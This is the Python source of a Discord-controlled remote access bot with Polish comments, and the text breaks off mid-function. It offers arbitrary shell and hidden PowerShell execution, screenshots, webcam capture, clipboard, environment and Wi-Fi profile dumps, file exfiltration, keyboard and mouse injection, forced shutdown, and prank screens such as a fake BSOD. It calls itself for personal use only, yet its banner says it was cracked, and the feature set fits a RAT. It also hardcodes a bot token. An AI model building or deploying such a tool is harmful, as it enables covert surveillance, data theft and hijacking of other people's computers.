# ============================================================
#  DISCORD REMOTE CONTROL BOT
#  ⚠️  TYLKO DO UŻYTKU NA WŁASNYM KOMPUTERZE
#  ⚠️  Używanie na cudzych maszynach = przestępstwo
# ============================================================

import discord
from discord.ext import commands
import subprocess
import os
import sys
import platform
import psutil
import asyncio
import ctypes
import time
import shutil
import socket
import webbrowser
import requests
import io
from datetime import datetime
from pathlib import Path
from collections import defaultdict


# ================== KONFIG ==================
# ⬇⬇⬇ ZMIEŃ TYLKO TĘ LINIĘ ⬇⬇⬇
TOKEN = "MTU0MDgzMTY2MzA0OTgwMTg5MQ.GYb_44.N-FIkYp5RxhONk1gIylNSt9-Z7IpBdjDX9GJOY"
# ⬆⬆⬆ ZMIEŃ TYLKO TĘ LINIĘ ⬆⬆⬆

PREFIX = "!"
LOG_FILE = "audit.log"
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
VERSION = "2.0"
# ============================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)


# ============== KOLORY KONSOLI ==============
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"


if IS_WINDOWS:
    os.system("")  # włącz kolory ANSI w Windows Terminal


def cprint(color, text):
    print(f"{color}{text}{C.RESET}")


# ============== RATE LIMIT ==============
_rate = defaultdict(list)

def rate_ok(user_id, max_per_10s=10):
    now = time.time()
    _rate[user_id] = [t for t in _rate[user_id] if now - t < 10]
    if len(_rate[user_id]) >= max_per_10s:
        return False
    _rate[user_id].append(now)
    return True


# ============== POMOCNICZE ==============
def resource_path(name):
    """Ścieżka do pliku dołączonego do .exe."""
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, name)
    return os.path.join(os.path.abspath("."), name)


def base_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


def log(cmd, user):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {user} ({user.id}): {cmd}\n")
    except Exception:
        pass


def ps_run(script):
    flags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
    return subprocess.Popen(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script],
        creationflags=flags
    )


def sh_run(cmd, timeout=30):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)


def truncate(text, n=1900):
    text = text or "(brak wyjścia)"
    if len(text) > n:
        return text[:n] + "\n... (obcięto)"
    return text


def fmt_uptime(seconds):
    d, h = divmod(int(seconds) // 3600, 24)
    h, m = divmod(h, 24) if False else (h, (int(seconds) % 3600) // 60)
    s = int(seconds) % 60
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)


def send_long(ctx, text, filename="output.txt"):
    """Wysyła długie wyjście jako plik, jeśli > 1900 znaków."""
    if len(text) > 1900:
        buf = io.BytesIO(text.encode("utf-8"))
        await_send = ctx.send(file=discord.File(buf, filename=filename))
        return await_send
    return None


def have(cmd):
    return shutil.which(cmd) is not None


# ============== EVENTY ==============
@bot.event
async def on_ready():
    cprint(C.CYAN + C.BOLD, "=" * 55)
    cprint(C.CYAN, f"  Wersjia: v2.0 ")
    cprint(C.CYAN, f"  zcrackowane przez wypiorekkk")
    cprint(C.CYAN, f"  📦 Wersja: {VERSION}")
    cprint(C.CYAN + C.BOLD, "=" * 55)
    try:
        await bot.change_presence(
            status=discord.Status.online,
            activity=discord.Game(name=f"{PREFIX}help | {platform.node()}")
        )
    except Exception:
        pass


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        return await ctx.send(
            embed=discord.Embed(
                title="❌ Brak argumentu",
                description=f"Brakuje: `{error.param.name}`\nUżyj `{PREFIX}help {ctx.command}` po szczegóły.",
                color=0xff4444
            )
        )
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(embed=discord.Embed(
        title="❌ Błąd", description=f"`{error}`", color=0xff4444
    ))


# ============== HELP ==============
HELP_DATA = {
    "system": {
        "icon": "🔧",
        "title": "System",
        "cmds": [
            ("info", "Pełne info o systemie (CPU/RAM/dysk/uptime)"),
            ("hostname", "Nazwa komputera"),
            ("whoami", "Zalogowany użytkownik"),
            ("ip", "Lokalne i publiczne IP"),
            ("uptime", "Czas działania systemu"),
            ("battery", "Stan baterii"),
            ("disk", "Lista dysków i zajętość"),
            ("drives", "Wszystkie partycje (także sieciowe)"),
            ("gpu", "Karta graficzna"),
            ("temp", "Temperatury CPU/GPU (jeśli dostępne)"),
            ("time", "Data i godzina systemowa"),
            ("env", "Zmienne środowiskowe"),
            ("clipboard", "Zawartość schowka"),
        ]
    },
    "shell": {
        "icon": "🖥️",
        "title": "Shell",
        "cmds": [
            ("shell <cmd>", "Wykonaj komendę CMD/bash"),
            ("ps <cmd>", "Wykonaj komendę PowerShell"),
            ("shell-bg <cmd>", "Uruchom komendę w tle"),
        ]
    },
    "siec": {
        "icon": "🌐",
        "title": "Sieć",
        "cmds": [
            ("ping <host>", "Pinguj hosta (4 pakiety)"),
            ("tracert <host>", "Trasa do hosta"),
            ("nslookup <host>", "DNS lookup"),
            ("netstat", "Aktywne połączenia"),
            ("wifi", "Zapisane sieci WiFi"),
            ("users", "Zalogowani użytkownicy"),
        ]
    },
    "zasilanie": {
        "icon": "⚡",
        "title": "Zasilanie",
        "cmds": [
            ("kill", "Wyłącz komputer (10s opóźnienia)"),
            ("reboot", "Restart komputera"),
            ("abort", "Anuluj shutdown/restart"),
            ("sleep", "Uśpij komputer"),
            ("hibernate", "Hibernacja"),
            ("lock", "Zablokuj ekran"),
            ("logout", "Wyloguj użytkownika"),
        ]
    },
    "procesy": {
        "icon": "💀",
        "title": "Procesy",
        "cmds": [
            ("processes", "Lista procesów (sort CPU)"),
            ("top", "TOP 10 procesów (CPU)"),
            ("killproc <nazwa>", "Zabij proces po nazwie"),
            ("start <ścieżka>", "Uruchom program"),
            ("freeze <pid>", "Zawieś proces"),
            ("unfreeze <pid>", "Wznów proces"),
            ("services", "Lista usług systemowych"),
            ("startup", "Programy w autostarcie"),
        ]
    },
    "troll": {
        "icon": "😈",
        "title": "Troll",
        "cmds": [
            ("say <tekst>", "TTS — czytaj tekst na głos"),
            ("open <url>", "Otwórz stronę w przeglądarce"),
            ("volume <0-100>", "Ustaw głośność"),
            ("mute", "Wycisz system"),
            ("wallpaper <url>", "Zmień tapetę"),
            ("msgbox <tekst>", "Okno dialogowe"),
            ("beep", "Pisk systemowy"),
            ("invert", "Odwróć kolory ekranu"),
            ("capslock", "Przełącz Caps Lock"),
            ("spam <n> <tekst>", "Spam okienkami"),
            ("minimize", "Zminimalizuj wszystko (Win+D)"),
            ("shake", "Potrząśnij aktywnym oknem"),
            ("rickroll", "Rickroll w przeglądarce"),
            ("bsod", "Fałszywy BSOD (fake)"),
            ("fake-update", "Fałszywa aktualizacja Windows"),
            ("matrix", "Efekt Matrix w oknie"),
            ("flip", "Obróć ekran o 180°"),
            ("unflip", "Przywróć ekran"),
            ("swapmouse", "Zamień przyciski myszy"),
            ("unswapmouse", "Przywróć przyciski myszy"),
            ("cursor <x> <y>", "Przesuń kursor"),
            ("hideicons", "Ukryj ikony pulpitu"),
            ("showicons", "Pokaż ikony pulpitu"),
            ("taskbar", "Ukryj pasek zadań"),
            ("taskbar-on", "Pokaż pasek zadań"),
        ]
    },
    "multimedia": {
        "icon": "📸",
        "title": "Multimedia",
        "cmds": [
            ("screenshot", "Zrzut ekranu"),
            ("webcam", "Zdjęcie z kamery"),
            ("record <sek>", "Nagraj ekran (max 30s)"),
            ("play <url>", "Odtwórz dźwięk z URL"),
        ]
    },
    "pliki": {
        "icon": "📁",
        "title": "Pliki",
        "cmds": [
            ("pwd", "Aktualny katalog"),
            ("cd <ścieżka>", "Zmień katalog (tylko dla bota)"),
            ("ls [ścieżka]", "Lista plików"),
            ("cat <plik>", "Zawartość pliku"),
            ("head <plik> [n]", "Pierwsze n linii"),
            ("tail <plik> [n]", "Ostatnie n linii"),
            ("grep <wzorzec> <plik>", "Szukaj w pliku"),
            ("download <plik>", "Wyślij plik na Discord"),
            ("upload <ścieżka>", "Zapisz załącznik z Discorda"),
            ("rm <ścieżka>", "Usuń plik/folder"),
            ("mkdir <ścieżka>", "Utwórz folder"),
            ("find <wzorzec>", "Szukaj plików"),
            ("tree [ścieżka]", "Drzewo katalogów"),
            ("zip <ścieżka>", "Spakuj do ZIP"),
        ]
    },
    "wejscie": {
        "icon": "⌨️",
        "title": "Wejście",
        "cmds": [
            ("type <tekst>", "Wpisz tekst z klawiatury"),
            ("press <klawisz>", "Naciśnij klawisz"),
            ("hotkey <k1> <k2>", "Skrót klawiszowy"),
            ("click <x> <y>", "Kliknij lewym"),
            ("rclick <x> <y>", "Kliknij prawym"),
            ("doubleclick <x> <y>", "Podwójny klik"),
            ("move <x> <y>", "Przesuń mysz"),
            ("scroll <n>", "Przewiń"),
        ]
    },
    "info": {
        "icon": "ℹ️",
        "title": "Info",
        "cmds": [
            ("ping-bot", "Sprawdź opóźnienie bota"),
            ("stats", "Statystyki bota"),
            ("help [kategoria]", "Ta wiadomość / kategoria"),
        ]
    }
}


@bot.command(name="help")
async def help_cmd(ctx, kategoria: str = None):
    if kategoria is None:
        # Główny help — wszystkie kategorie
        embed = discord.Embed(
            title=f"📖 {bot.user.name} — Panel sterowania",
            description=f"Wersja **{VERSION}** · Prefix **`{PREFIX}`**\nUżyj `{PREFIX}help <kategoria>` po szczegóły.",
            color=0x5865F2
        )
        for key, data in HELP_DATA.items():
            cmds = ", ".join(f"`{PREFIX}{c[0].split()[0]}`" for c in data["cmds"])
            embed.add_field(
                name=f"{data['icon']} {data['title']}",
                value=cmds if len(cmds) < 1000 else cmds[:1000] + "...",
                inline=False
            )
        embed.set_footer(text=f"System: {platform.system()} {platform.release()} · Host: {platform.node()}")
        return await ctx.send(embed=embed)

    # Help dla konkretnej kategorii
    key = kategoria.lower()
    if key not in HELP_DATA:
        # Spróbuj dopasować
        for k in HELP_DATA:
            if key in k:
                key = k
                break
        else:
            return await ctx.send(f"❌ Nieznana kategoria: `{kategoria}`\nDostępne: {', '.join(HELP_DATA.keys())}")

    data = HELP_DATA[key]
    embed = discord.Embed(
        title=f"{data['icon']} {data['title']}",
        description=f"Kategoria komend · `{PREFIX}help` aby wrócić",
        color=0x57F287
    )
    for cmd, desc in data["cmds"]:
        embed.add_field(name=f"`{PREFIX}{cmd}`", value=desc, inline=False)
    await ctx.send(embed=embed)


# ================== SYSTEM ==================
@bot.command(name="info")
async def info(ctx):
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
    up = time.time() - psutil.boot_time()

    embed = discord.Embed(title="🖥️ Informacje o systemie", color=0x2ecc71, timestamp=datetime.now())
    embed.add_field(name="💻 System", value=f"`{platform.system()} {platform.release()}`", inline=False)
    embed.add_field(name="🏠 Host", value=f"`{platform.node()}`", inline=True)
    embed.add_field(name="👤 User", value=f"`{os.getlogin() if hasattr(os, 'getlogin') else '?'}`", inline=True)
    embed.add_field(name="🐍 Python", value=f"`{platform.python_version()}`", inline=True)
    embed.add_field(name="⚙️ CPU", value=f"`{cpu}%` ({psutil.cpu_count()} rdzeni)", inline=True)
    embed.add_field(name="🧠 RAM", value=f"`{ram.percent}%` ({ram.used//(1024**2)}/{ram.total//(1024**2)} MB)", inline=True)
    embed.add_field(name="⏱️ Uptime", value=f"`{fmt_uptime(up)}`", inline=True)
    embed.add_field(name="📅 Boot", value=f"`{boot}`", inline=False)
    embed.set_footer(text=f"Bot {VERSION}")
    await ctx.send(embed=embed)


@bot.command(name="hostname")
async def hostname(ctx):
    await ctx.send(f"🏠 `{platform.node()}`")


@bot.command(name="whoami")
async def whoami(ctx):
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "?"
    r = sh_run("whoami") if not IS_WINDOWS else sh_run("whoami")
    await ctx.send(f"👤 **User:** `{user}`\n📛 **Full:** `{r.stdout.strip() or '?'}`")


@bot.command(name="ip")
async def ip_cmd(ctx):
    try:
        local = socket.gethostbyname(socket.gethostname())
    except Exception:
        local = "?"
    try:
        public = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        public = "?"

    embed = discord.Embed(title="🌐 Adresy IP", color=0x3498db)
    embed.add_field(name="Lokalne", value=f"`{local}`", inline=True)
    embed.add_field(name="Publiczne", value=f"`{public}`", inline=True)
    await ctx.send(embed=embed)


@bot.command(name="uptime")
async def uptime(ctx):
    up = time.time() - psutil.boot_time()
    await ctx.send(f"⏱️ Uptime: `{fmt_uptime(up)}`")


@bot.command(name="battery")
async def battery(ctx):
    b = psutil.sensors_battery()
    if not b:
        return await ctx.send("❌ Brak baterii (desktop?).")
    plug = "🔌 podłączony" if b.power_plugged else "🔋 na baterii"
    emoji = "🟢" if b.percent > 50 else "🟡" if b.percent > 20 else "🔴"
    await ctx.send(f"{emoji} Bateria: **{b.percent}%** — {plug}")


@bot.command(name="disk")
async def disk_cmd(ctx):
    lines = []
    for p in psutil.disk_partitions(all=False):
        try:
            u = psutil.disk_usage(p.mountpoint)
            bar_len = 20
            filled = int(u.percent / 100 * bar_len)
            bar = "█" * filled + "░" * (bar_len - filled)
            lines.append(f"`{p.device:<12}` `{bar}` {u.percent:>5.1f}%  ({u.free//(1024**3)} GB wolne)")
        except Exception:
            pass
    await ctx.send("💾 **Dyski:**\n" + "\n".join(lines))


@bot.command(name="drives")
async def drives(ctx):
    lines = []
    for p in psutil.disk_partitions(all=True):
        try:
            u = psutil.disk_usage(p.mountpoint)
            lines.append(f"`{p.device:<12}` {p.fstype:<8} {u.total//(1024**3)}GB / {u.percent}%")
        except Exception:
            lines.append(f"`{p.device:<12}` {p.fstype:<8} (niedostępny)")
    await ctx.send(f"```\n{truncate(chr(10).join(lines))}\n```")


@bot.command(name="gpu")
async def gpu(ctx):
    if IS_WINDOWS:
        r = sh_run('wmic path win32_VideoController get name,adapterram')
        await ctx.send(f"🎮 ```\n{truncate(r.stdout + r.stderr)}\n```")
    else:
        r = sh_run("lspci | grep -i vga")
        await ctx.send(f"🎮 ```\n{truncate(r.stdout + r.stderr)}\n```")


@bot.command(name="temp")
async def temp(ctx):
    try:
        temps = psutil.sensors_temperatures()
        if not temps:
            return await ctx.send("❌ Brak czujników temperatury.")
        lines = []
        for name, entries in temps.items():
            for e in entries:
                lines.append(f"{name}: {e.current}°C (max: {e.high}°C)")
        await ctx.send(f"🌡️ ```\n{truncate(chr(10).join(lines))}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="time")
async def time_cmd(ctx):
    now = datetime.now()
    await ctx.send(f"📅 `{now.strftime('%Y-%m-%d %H:%M:%S')}`")


@bot.command(name="env")
async def env_cmd(ctx):
    lines = [f"{k}={v}" for k, v in list(os.environ.items())[:50]]
    await ctx.send(f"```\n{truncate(chr(10).join(lines))}\n```")


@bot.command(name="clipboard")
async def clipboard(ctx):
    try:
        if IS_WINDOWS:
            r = sh_run("powershell -Command Get-Clipboard")
        else:
            r = sh_run("xclip -selection clipboard -o 2>/dev/null || xsel -b")
        out = r.stdout or "(pusty)"
        await ctx.send(f"📋 ```\n{truncate(out)}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


# ================== SHELL ==================
@bot.command(name="shell")
async def shell(ctx, *, cmd: str):
    """Wykonaj komendę CMD/bash."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        out = r.stdout + r.stderr or "(brak wyjścia)"
        if len(out) > 1900:
            buf = io.BytesIO(out.encode("utf-8"))
            return await ctx.send("📄 Wyjście za duże, wysyłam jako plik:",
                                  file=discord.File(buf, filename="shell_output.txt"))
        await ctx.send(f"```\n{out}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("⏱️ Timeout 60s")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="ps")
async def ps_cmd(ctx, *, cmd: str):
    """Wykonaj komendę PowerShell."""
    if not IS_WINDOWS:
        return await ctx.send("❌ PowerShell tylko na Windows. Użyj `!shell`.")
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                           capture_output=True, text=True, timeout=60)
        out = r.stdout + r.stderr or "(brak wyjścia)"
        if len(out) > 1900:
            buf = io.BytesIO(out.encode("utf-8"))
            return await ctx.send("📄 Wyjście za duże:", file=discord.File(buf, filename="ps_output.txt"))
        await ctx.send(f"```\n{out}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("⏱️ Timeout 60s")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="shell-bg")
async def shell_bg(ctx, *, cmd: str):
    """Uruchom komendę w tle i wyślij wynik gdy skończy."""
    await ctx.send(f"⏳ Uruchomiono w tle: `{cmd}`")

    async def run():
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            out = (r.stdout + r.stderr)[:1900] or "(brak wyjścia)"
            await ctx.send(f"✅ `{cmd}` zakończone:\n```\n{out}\n```")
        except Exception as e:
            await ctx.send(f"❌ `{cmd}`: {e}")

    asyncio.create_task(run())


# ================== SIEĆ ==================
@bot.command(name="ping")
async def ping_net(ctx, host: str):
    param = "-n" if IS_WINDOWS else "-c"
    r = sh_run(f"ping {param} 4 {host}", timeout=15)
    await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")


@bot.command(name="tracert")
async def tracert(ctx, host: str):
    cmd = "tracert" if IS_WINDOWS else "traceroute"
    r = sh_run(f"{cmd} -h 15 {host}", timeout=60)
    await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")


@bot.command(name="nslookup")
async def nslookup(ctx, host: str):
    r = sh_run(f"nslookup {host}", timeout=15)
    await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")


@bot.command(name="netstat")
async def netstat(ctx):
    try:
        conns = psutil.net_connections(kind="inet")
        lines = []
        for c in conns[:30]:
            if c.raddr:
                lines.append(f"{c.laddr} -> {c.raddr} [{c.status}] pid={c.pid}")
        await ctx.send(f"```\n{truncate(chr(10).join(lines) or 'brak')}\n```")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="wifi")
async def wifi(ctx):
    if IS_WINDOWS:
        r = sh_run("netsh wlan show profiles")
    elif IS_LINUX:
        r = sh_run("nmcli -f NAME connection show")
    else:
        r = sh_run("echo 'unsupported'")
    await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")


@bot.command(name="users")
async def users(ctx):
    r = sh_run("query user") if IS_WINDOWS else sh_run("who")
    await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")


# ================== ZASILANIE ==================
@bot.command(name="kill")
async def kill(ctx):
    embed = discord.Embed(title="💀 Wyłączanie", description="Komputer wyłączy się za **10 sekund**.\nUżyj `!abort` aby anulować.", color=0xff4444)
    await ctx.send(embed=embed)
    sh_run("shutdown /s /t 10") if IS_WINDOWS else sh_run("shutdown -h +0")


@bot.command(name="reboot")
async def reboot(ctx):
    embed = discord.Embed(title="🔄 Restart", description="Restart za **10 sekund**.\nUżyj `!abort` aby anulować.", color=0xffa500)
    await ctx.send(embed=embed)
    sh_run("shutdown /r /t 10") if IS_WINDOWS else sh_run("shutdown -r +0")


@bot.command(name="abort")
async def abort(ctx):
    sh_run("shutdown /a") if IS_WINDOWS else sh_run("shutdown -c")
    await ctx.send("✅ Anulowano.")


@bot.command(name="sleep")
async def sleep_cmd(ctx):
    await ctx.send("😴 Usypiam...")
    if IS_WINDOWS:
        ps_run("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState('Suspend', $false, $false)")
    else:
        sh_run("systemctl suspend")


@bot.command(name="hibernate")
async def hibernate(ctx):
    await ctx.send("🛌 Hibernacja...")
    sh_run("shutdown /h") if IS_WINDOWS else sh_run("systemctl hibernate")


@bot.command(name="lock")
async def lock(ctx):
    if IS_WINDOWS:
        ctypes.windll.user32.LockWorkStation()
    elif IS_LINUX:
        sh_run("loginctl lock-session")
    await ctx.send("🔒 Zablokowano.")


@bot.command(name="logout")
async def logout_cmd(ctx):
    await ctx.send("👋 Wylogowywanie...")
    sh_run("shutdown /l") if IS_WINDOWS else sh_run("pkill -KILL -u $USER")


# ================== PROCESY ==================
@bot.command(name="processes")
async def processes(ctx):
    procs = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
        try:
            procs.append(p.info)
        except Exception:
            pass
    procs.sort(key=lambda x: x["cpu_percent"] or 0, reverse=True)
    lines = [f"{p['pid']:>6}  {(p['name'] or '?')[:32]:<32} CPU:{p['cpu_percent'] or 0:>5.1f}% RAM:{p['memory_percent'] or 0:>4.1f}%"
             for p in procs[:25]]
    await ctx.send(f"```\n{truncate(chr(10).join(lines))}\n```")


@bot.command(name="top")
async def top(ctx):
    procs = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent"]):
        try:
            procs.append(p.info)
        except Exception:
            pass
    procs.sort(key=lambda x: x["cpu_percent"] or 0, reverse=True)
    lines = [f"{i+1}. {p['name']:<35} CPU: {p['cpu_percent'] or 0:>5.1f}%  (PID {p['pid']})"
             for i, p in enumerate(procs[:10])]
    await ctx.send("🔥 **TOP 10 (CPU)**\n```\n" + "\n".join(lines) + "\n```")


@bot.command(name="killproc")
async def killproc(ctx, *, name: str):
    killed = 0
    for p in psutil.process_iter(["name"]):
        try:
            if name.lower() in (p.info["name"] or "").lower():
                p.kill()
                killed += 1
        except Exception:
            pass
    await ctx.send(f"☠️ Zabito **{killed}** proces(ów) po `{name}`.")


@bot.command(name="start")
async def start(ctx, *, path: str):
    try:
        subprocess.Popen(path, shell=True)
        await ctx.send(f"🚀 Uruchomiono: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="freeze")
async def freeze(ctx, pid: int):
    try:
        psutil.Process(pid).suspend()
        await ctx.send(f"🧊 PID `{pid}` zawieszony. (`!unfreeze {pid}`)")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="unfreeze")
async def unfreeze(ctx, pid: int):
    try:
        psutil.Process(pid).resume()
        await ctx.send(f"▶️ PID `{pid}` wznowiony.")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="services")
async def services(ctx):
    if IS_WINDOWS:
        r = sh_run("sc query state= all")
        out = r.stdout[:1900]
    else:
        r = sh_run("systemctl list-units --type=service --no-pager")
        out = r.stdout[:1900]
    await ctx.send(f"```\n{out or '(brak)'}\n```")


@bot.command(name="startup")
async def startup(ctx):
    if IS_WINDOWS:
        r = sh_run('wmic startup get caption,command')
        await ctx.send(f"```\n{truncate(r.stdout + r.stderr)}\n```")
    else:
        await ctx.send("❌ Tylko Windows.")


# ================== TROLL ==================
@bot.command(name="say")
async def say(ctx, *, text: str):
    if IS_WINDOWS:
        safe = text.replace("'", "''")
        ps_run(f"Add-Type -AssemblyName System.Speech; "
               f"$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('{safe}')")
    elif IS_LINUX and have("espeak"):
        subprocess.Popen(["espeak", text])
    await ctx.send(f"🗣️ Mówię: `{text}`")


@bot.command(name="open")
async def open_url(ctx, *, url: str):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    webbrowser.open(url)
    await ctx.send(f"🌐 Otwieram: `{url}`")


@bot.command(name="volume")
async def volume(ctx, level: int):
    level = max(0, min(100, level))
    nircmd = resource_path("nircmd.exe")
    if IS_WINDOWS and os.path.exists(nircmd):
        subprocess.run([nircmd, "setsysvolume", str(int(level * 655.35))])
        await ctx.send(f"🔊 Głośność: **{level}%**")
    elif IS_LINUX:
        sh_run(f"amixer set Master {level}%")
        await ctx.send(f"🔊 Głośność: **{level}%**")
    else:
        await ctx.send("❌ Wymaga `nircmd.exe` obok .exe (Windows).")


@bot.command(name="mute")
async def mute(ctx):
    nircmd = resource_path("nircmd.exe")
    if IS_WINDOWS and os.path.exists(nircmd):
        subprocess.run([nircmd, "mutesysvolume", "1"])
    elif IS_LINUX:
        sh_run("amixer set Master mute")
    await ctx.send("🔇 Wyciszono.")


@bot.command(name="wallpaper")
async def wallpaper(ctx, *, url: str):
    try:
        tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "wall.jpg")
        with open(tmp, "wb") as f:
            f.write(requests.get(url, timeout=15).content)
        if IS_WINDOWS:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
        elif IS_LINUX:
            sh_run(f"gsettings set org.gnome.desktop.background picture-uri file://{tmp}")
        await ctx.send("🖼️ Tapeta zmieniona.")
    except Exception as e:
        await ctx.send(f"❌ `{e}`")


@bot.command(name="msgbox")
async def msgbox(ctx, *, text: str):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    safe = text.replace("'", "''")
    ps_run(f"Add-Type -AssemblyName System.Windows.Forms; "
           f"[System.Windows.Forms.MessageBox]::Show('{safe}')")
    await ctx.send(f"💬 Okno: `{text}`")


@bot.command(name="beep")
async def beep(ctx):
    if IS_WINDOWS:
        ps_run("[console]::beep(1000,500)")
    else:
        print("\a")
    await ctx.send("🔔 Beep!")


@bot.command(name="invert")
async def invert(ctx):
    nircmd = resource_path("nircmd.exe")
    if IS_WINDOWS and os.path.exists(nircmd):
        subprocess.run([nircmd, "invertcolors"])
        await ctx.send("🎨 Kolory odwrócone.")
    else:
        await ctx.send("❌ Wymaga `nircmd.exe`.")


@bot.command(name="capslock")
async def capslock(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps_run("$w = New-Object -ComObject WScript.Shell; $w.SendKeys('{CAPSLOCK}')")
    await ctx.send("🔠 Caps Lock przełączony.")


@bot.command(name="spam")
async def spam(ctx, count: int, *, text: str):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    count = max(1, min(50, count))
    safe = text.replace("'", "''")
    for i in range(count):
        ps_run(f"Add-Type -AssemblyName System.Windows.Forms; "
               f"[System.Windows.Forms.MessageBox]::Show('{safe} ({i+1}/{count})')")
        time.sleep(0.3)
    await ctx.send(f"💥 {count} okien wysłanych.")


@bot.command(name="minimize")
async def minimize(ctx):
    try:
        import pyautogui
        pyautogui.hotkey("win", "d")
        await ctx.send("🪟 Zminimalizowano wszystko.")
    except Exception as e:
        await ctx.send(f"❌ `{e}` (pip install pyautogui)")


@bot.command(name="shake")
async def shake(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps = r'''
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W {
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h, IntPtr a, int x, int y, int c, int f);
}
"@
$h = [W]::GetForegroundWindow()
$r = New-Object System.Random
for ($i=0; $i -lt 40; $i++) {
  [W]::SetWindowPos($h, [IntPtr]::Zero, $r.Next(-30,30), $r.Next(-30,30), 0,0,0x1) | Out-Null
  Start-Sleep -Milliseconds 30
}
'''
    ps_run(ps)
    await ctx.send("📳 Trzęsę oknem!")


@bot.command(name="rickroll")
async def rickroll(ctx):
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    await ctx.send("🎵 Never gonna give you up...")


@bot.command(name="bsod")
async def bsod(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    await ctx.send("💙 Fake BSOD... (`Alt+F4` zamyka)")
    ps = r'''
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Windows.Forms.Form
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.TopMost = $true
$f.BackColor = 'Blue'
$l = New-Object System.Windows.Forms.Label
$l.Text = ":(`n`nYour PC ran into a problem and needs to restart.`nWe're just collecting some error info, and then we'll restart for you.`n`n0% complete"
$l.ForeColor = 'White'
$l.Font = New-Object System.Drawing.Font('Segoe UI', 24)
$l.AutoSize = $true
$l.Location = New-Object System.Drawing.Point(80, 200)
$f.Controls.Add($l)
[System.Windows.Forms.Application]::Run($f)
'''
    ps_run(ps)


@bot.command(name="fake-update")
async def fake_update(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    await ctx.send("⏳ Fake Windows Update...")
    ps = r'''
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Windows.Forms.Form
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.TopMost = $true
$f.BackColor = 'Black'
$l = New-Object System.Windows.Forms.Label
$l.Text = "Working on updates  0% complete`n`nDon't turn off your PC"
$l.ForeColor = 'White'
$l.Font = New-Object System.Drawing.Font('Segoe UI', 28)
$l.AutoSize = $true
$l.Location = New-Object System.Drawing.Point(100, 300)
$f.Controls.Add($l)
$f.Show()
$i = 0
while ($i -lt 100) {
  $i += 2
  $l.Text = "Working on updates  $i% complete`n`nDon't turn off your PC"
  [System.Windows.Forms.Application]::DoEvents()
  Start-Sleep -Milliseconds 500
}
$f.Close()
'''
    ps_run(ps)


@bot.command(name="matrix")
async def matrix(ctx):
    if not IS_WINDOWS:
        return await ctx.send("❌ Tylko Windows.")
    ps = r'''
$host.UI.RawUI.WindowTitle = "Matrix"
while ($true) {
  $line = -join (1..100 | ForEach-Object { 
